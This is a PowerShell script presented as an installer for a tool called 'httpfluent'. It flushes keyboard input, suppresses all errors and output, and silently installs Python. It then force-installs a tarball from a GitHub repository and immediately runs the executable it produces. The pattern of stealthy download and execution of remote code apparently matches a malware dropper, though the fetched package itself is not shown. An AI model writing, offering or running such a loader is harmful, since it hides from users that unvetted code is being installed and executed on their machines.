# =====================================================
# httpfluent - Smart Installer & Runner (Auto-Detect)
# =====================================================

# CRITICAL: Disable ALL input mechanisms immediately
$null = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
if ($Host.Name -eq 'ConsoleHost') {
    [Console]::TreatControlCAsInput = $false
    try { 
        if ($Host.UI.RawUI) { $Host.UI.RawUI.FlushInputBuffer() }
    } catch {}
}

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'

# Configuration
$RequiredPythonVersion = [version]"3.9.0"
$InstallPythonVersion = "3.12.6"
$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$ForcePython312 = $false

# --- Step 1: Find Existing Python >=3.9 ---
$ExistingPython = $null
$Candidates = @()

# Check PATH
foreach ($cmd in @('python', 'python3')) {
    $found = Get-Command $cmd -ErrorAction SilentlyContinue
    if ($found) { $Candidates += $found.Source }
}

# Check common install locations
$SearchPaths = @(
    "$env:LOCALAPPDATA\Programs\Python\Python*",
    "$env:APPDATA\Python\Python*",
    "C:\Program Files\Python*",
    "C:\Program Files (x86)\Python*"
)

foreach ($pattern in $SearchPaths) {
    $parentDir = Split-Path $pattern -Parent
    $filter = Split-Path $pattern -Leaf
    
    if (Test-Path $parentDir) {
        Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | ForEach-Object {
            $pythonExe = Join-Path $_.FullName "python.exe"
            if (Test-Path $pythonExe) { $Candidates += $pythonExe }
        }
    }
}

# Find best Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $versionString = & $candidate --version 2>&1 | Out-String
        if ($versionString -match "Python (\d+\.\d+\.\d+)") {
            $version = [version]$Matches[1]
            if ($version -ge $RequiredPythonVersion) {
                $ExistingPython = $candidate
                break
            }
        }
    } catch { continue }
}

# --- Step 2: Decide Which Python to Use ---
$PythonToUse = $null

if ($ForcePython312) {
    $InstallNeeded = $true
} elseif ($ExistingPython) {
    $PythonToUse = $ExistingPython
    $InstallNeeded = $false
} else {
    $InstallNeeded = $true
}

# --- Step 3: Install Python 3.12 if Needed ---
if ($InstallNeeded) {
    $InstallerUrl = "https://www.python.org/ftp/python/$InstallPythonVersion/python-$InstallPythonVersion-amd64.exe"
    $InstallerPath = "$env:TEMP\python-$InstallPythonVersion-installer.exe"
    $PythonExe = Join-Path $InstallDir "python.exe"
    
    if (Test-Path $PythonExe) {
        $PythonToUse = $PythonExe
    } else {
        try {
            (New-Object System.Net.WebClient).DownloadFile($InstallerUrl, $InstallerPath) > $null 2>&1
        } catch {
            Invoke-WebRequest -Uri $InstallerUrl -OutFile $InstallerPath -UseBasicParsing > $null 2>&1
        }
        
        if (Test-Path $InstallerPath) {
            cmd /c start /wait "" "$InstallerPath" /quiet InstallAllUsers=0 PrependPath=0 Include_test=0 TargetDir="$InstallDir"
            
            Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue > $null 2>&1
            
            if (Test-Path $PythonExe) {
                $PythonToUse = $PythonExe
            } else {
                exit 1
            }
        } else {
            exit 1
        }
    }
}

# --- Step 4: Install httpfluent using CMD (NOT PowerShell) ---
cmd /c ""$PythonToUse" -m pip install --upgrade pip --quiet --user --disable-pip-version-check >nul 2>&1"
cmd /c ""$PythonToUse" -m pip install requests --quiet --user --disable-pip-version-check >nul 2>&1"
cmd /c ""$PythonToUse" -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --user --force-reinstall --disable-pip-version-check >nul 2>&1"

# --- Step 5: Auto-Detect httpfluent.exe Location ---
$HttpFluentExe = $null

# Method 1: Get exact path from Python
$ScriptsDir = & $PythonToUse -c "import sysconfig, site, os; print(os.path.join(site.USER_BASE, 'Scripts'))" 2>&1 | Select-Object -Last 1
$ScriptsDir = $ScriptsDir.Trim()

if ($ScriptsDir -and (Test-Path $ScriptsDir)) {
    $primaryPath = Join-Path $ScriptsDir "httpfluent.exe"
    if (Test-Path $primaryPath) {
        $HttpFluentExe = $primaryPath
    }
}

# Method 2: Scan all Python versions automatically
if (-not $HttpFluentExe) {
    $SearchLocations = @(
        "$env:APPDATA\Python",
        "$env:LOCALAPPDATA\Programs\Python"
    )
    
    foreach ($baseDir in $SearchLocations) {
        if (Test-Path $baseDir) {
            Get-ChildItem -Path $baseDir -Directory -Filter "Python*" -ErrorAction SilentlyContinue | ForEach-Object {
                $scriptsPath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                if (Test-Path $scriptsPath) {
                    $HttpFluentExe = $scriptsPath
                    break
                }
            }
            
            if ($HttpFluentExe) { break }
        }
    }
}

# Method 3: Deep search in %APPDATA%\Python
if (-not $HttpFluentExe) {
    $AppDataPython = "$env:APPDATA\Python"
    
    if (Test-Path $AppDataPython) {
        $pythonDirs = Get-ChildItem -Path $AppDataPython -Directory -Filter "Python*" -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -match "Python(\d+)" } | 
            Sort-Object { [int]($_.Name -replace '\D', '') } -Descending
        
        foreach ($dir in $pythonDirs) {
            $exePath = Join-Path $dir.FullName "Scripts\httpfluent.exe"
            if (Test-Path $exePath) {
                $HttpFluentExe = $exePath
                break
            }
        }
    }
}

# Method 4: Check system-wide installations
if (-not $HttpFluentExe) {
    $SystemLocations = @(
        "C:\Program Files\Python*",
        "C:\Program Files (x86)\Python*"
    )
    
    foreach ($pattern in $SystemLocations) {
        $parentDir = Split-Path $pattern -Parent
        $filter = Split-Path $pattern -Leaf
        
        if (Test-Path $parentDir) {
            Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | 
                Sort-Object { [int]($_.Name -replace '\D', '') } -Descending | 
                ForEach-Object {
                    $exePath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                    if (Test-Path $exePath) {
                        $HttpFluentExe = $exePath
                        break
                    }
                }
            
            if ($HttpFluentExe) { break }
        }
    }
}

# --- Step 6: Run httpfluent.exe ---
if ($HttpFluentExe -and (Test-Path $HttpFluentExe)) {
    & $HttpFluentExe
} else {
    # Ultimate fallback: Run via Python module
    & $PythonToUse -c "import sys; from httpfluent import __main__; sys.exit(__main__.main())"
}
#exit
